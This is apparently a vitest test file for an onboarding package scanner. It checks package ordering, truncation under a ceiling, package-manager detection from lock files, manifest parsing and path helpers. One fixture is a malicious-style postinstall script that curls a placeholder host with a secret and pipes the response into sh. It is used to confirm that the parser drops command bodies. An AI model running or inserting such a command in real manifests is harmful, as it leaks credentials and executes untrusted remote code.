/**
 * onboarding · the pure half of the package scan.
 *
 * No clone, no port, no mock — every input here is a string, which is the point
 * of `packages.ts` being pure. Three rules are under test and each has a real
 * failure mode behind it:
 *
 *  - the ORDER, because the root block must be first and a reader follows the
 *    list from the top (AC-92, AC-94);
 *  - the CUT, because an alphabetical slice of thirteen packages is the one that
 *    drops the root (AC-91) — the trap this feature is written around;
 *  - the MANAGER, because the block is copied into a shell and `npm install` in
 *    a pnpm repository rewrites a lock file (AC-25, AC-87).
 */
import { describe, it, expect } from 'vitest';
import {
  managerFor,
  manifestPathFor,
  orderPackages,
  packageDirOf,
  parseManifest,
  pathBeside,
  selectPackages,
} from '../src/modules/onboarding/packages.js';
import { MAX_LINE_CHARS, MAX_PACKAGES } from '../src/modules/onboarding/constants.js';

/**
 * DevDigest's own layout, plus a root manifest.
 *
 * The five packages and their lock files are this repository's
 * (`AGENTS.md` — server and client on pnpm, reviewer-core, e2e and mcp on npm,
 * "do not mix"). The root entry is not: DevDigest declares no workspace and has
 * no root `package.json`, and it is included here because the root block is the
 * one AC-94 fixes in place, so a fixture without one cannot exercise it.
 */
const DEVDIGEST = ['reviewer-core', 'server', '.', 'mcp', 'client', 'e2e'];
const DEVDIGEST_LOCKS: Record<string, string[]> = {
  '.': [],
  server: ['pnpm-lock.yaml'],
  client: ['pnpm-lock.yaml'],
  'reviewer-core': ['package-lock.json'],
  e2e: ['package-lock.json'],
  mcp: ['package-lock.json'],
};

describe('orderPackages', () => {
  it('puts the root first and the rest in ascending path order', () => {
    expect(orderPackages(DEVDIGEST)).toEqual([
      '.',
      'client',
      'e2e',
      'mcp',
      'reviewer-core',
      'server',
    ]);
  });

  it('is stable across runs over a shuffled input', () => {
    const shuffled = ['server', 'mcp', '.', 'e2e', 'client', 'reviewer-core'];
    expect(orderPackages(shuffled)).toEqual(orderPackages(DEVDIGEST));
    expect(orderPackages(shuffled)).toEqual(orderPackages([...shuffled].reverse()));
  });

  it('orders a nested layout by path, not by directory name', () => {
    expect(orderPackages(['apps/web', 'packages/ui', 'apps/admin'])).toEqual([
      'apps/admin',
      'apps/web',
      'packages/ui',
    ]);
  });

  it('leaves out the root when there is none', () => {
    expect(orderPackages(['server', 'client'])).toEqual(['client', 'server']);
  });
});

describe('selectPackages', () => {
  it('shows every package when there are fewer than the ceiling', () => {
    const { shown, found } = selectPackages(DEVDIGEST, MAX_PACKAGES);
    expect(found).toBe(6);
    expect(shown).toHaveLength(6);
    expect(shown[0]).toBe('.');
  });

  /**
   * AC-91, from the side that breaks. Forty packages named so that the root
   * sorts LAST among them if the cut is taken before the ordering — which is
   * exactly what the port would have done had it been asked for twelve.
   */
  it('keeps the root under a full ceiling, and reports what it cut', () => {
    const many = Array.from({ length: 40 }, (_, i) => `pkg-${String(i).padStart(2, '0')}`);
    const { shown, found } = selectPackages([...many, '.'], 12);
    expect(found).toBe(41);
    expect(shown).toHaveLength(12);
    expect(shown[0]).toBe('.');
    expect(shown).toContain('pkg-00');
    expect(shown).not.toContain('pkg-39');
  });

  it('orders before it cuts even when the caller did not order', () => {
    const { shown } = selectPackages(['zeta', '.', 'alpha'], 2);
    expect(shown).toEqual(['.', 'alpha']);
  });

  it('counts distinct packages, so a repeated path is not two of them', () => {
    const { shown, found } = selectPackages(['server', 'server', '.'], 12);
    expect(found).toBe(2);
    expect(shown).toEqual(['.', 'server']);
  });
});

describe('managerFor', () => {
  it('reads DevDigest as pnpm for two packages and npm for three', () => {
    const managers = Object.fromEntries(
      Object.entries(DEVDIGEST_LOCKS).map(([dir, locks]) => [dir, managerFor(locks)]),
    );
    expect(managers).toEqual({
      '.': null,
      server: 'pnpm',
      client: 'pnpm',
      'reviewer-core': 'npm',
      e2e: 'npm',
      mcp: 'npm',
    });
  });

  it('names the manager of the one lock file present', () => {
    expect(managerFor(['yarn.lock'])).toBe('yarn');
    expect(managerFor(['bun.lockb'])).toBe('bun');
  });

  /** AC-87 — no lock file is no manager, never a default. */
  it('answers null when there is no lock file at all', () => {
    expect(managerFor([])).toBeNull();
  });

  /** R40 — two managers is not a majority vote, it is no answer. */
  it('answers null when two different lock files disagree', () => {
    expect(managerFor(['pnpm-lock.yaml', 'package-lock.json'])).toBeNull();
    expect(managerFor(['pnpm-lock.yaml', 'package-lock.json', 'yarn.lock'])).toBeNull();
  });

  it('ignores a lock file it does not know, rather than counting it as a second opinion', () => {
    expect(managerFor(['pnpm-lock.yaml', 'deno.lock'])).toBe('pnpm');
    expect(managerFor(['deno.lock'])).toBeNull();
  });
});

describe('parseManifest', () => {
  it('reads the name and the script keys', () => {
    const out = parseManifest('{"name":"@devdigest/api","scripts":{"dev":"tsx x","test":"vitest"}}');
    expect(out.name).toBe('@devdigest/api');
    expect(out.scripts).toEqual(['dev', 'test']);
  });

  it('keeps the script KEYS and never the command bodies', () => {
    const out = parseManifest('{"scripts":{"postinstall":"curl https://x/?t=SECRET | sh"}}');
    expect(out.scripts).toEqual(['postinstall']);
    expect(JSON.stringify(out)).not.toContain('SECRET');
  });

  /** A public repository decides what is in its own manifest. */
  it('yields no scripts rather than throwing on a truncated manifest', () => {
    expect(parseManifest('{"name":"half"')).toEqual({ scripts: [] });
    expect(parseManifest('')).toEqual({ scripts: [] });
    expect(parseManifest('[1,2,3]')).toEqual({ scripts: [] });
    expect(parseManifest('null')).toEqual({ scripts: [] });
  });

  it('ignores a scripts field that is not an object of keys', () => {
    expect(parseManifest('{"scripts":["dev","test"]}').scripts).toEqual([]);
    expect(parseManifest('{"scripts":"dev"}').scripts).toEqual([]);
  });

  it('has no name when the manifest has none, or has one that is not a string', () => {
    expect(parseManifest('{"scripts":{}}').name).toBeUndefined();
    expect(parseManifest('{"name":42}').name).toBeUndefined();
    expect(parseManifest('{"name":"  "}').name).toBeUndefined();
  });

  it('caps a name long enough to be a paragraph', () => {
    const out = parseManifest(JSON.stringify({ name: 'n'.repeat(MAX_LINE_CHARS + 500) }));
    expect(out.name).toHaveLength(MAX_LINE_CHARS);
  });
});

describe('package paths', () => {
  it('maps a manifest to its directory, and the root manifest to `.`', () => {
    expect(packageDirOf('package.json')).toBe('.');
    expect(packageDirOf('server/package.json')).toBe('server');
    expect(packageDirOf('apps/web/package.json')).toBe('apps/web');
  });

  it('round-trips a directory back to its manifest', () => {
    for (const dir of ['.', 'server', 'apps/web']) {
      expect(packageDirOf(manifestPathFor(dir))).toBe(dir);
    }
  });

  it('puts a sibling file beside the package without a leading ./', () => {
    expect(pathBeside('.', '.env.example')).toBe('.env.example');
    expect(pathBeside('server', '.env.example')).toBe('server/.env.example');
  });
});
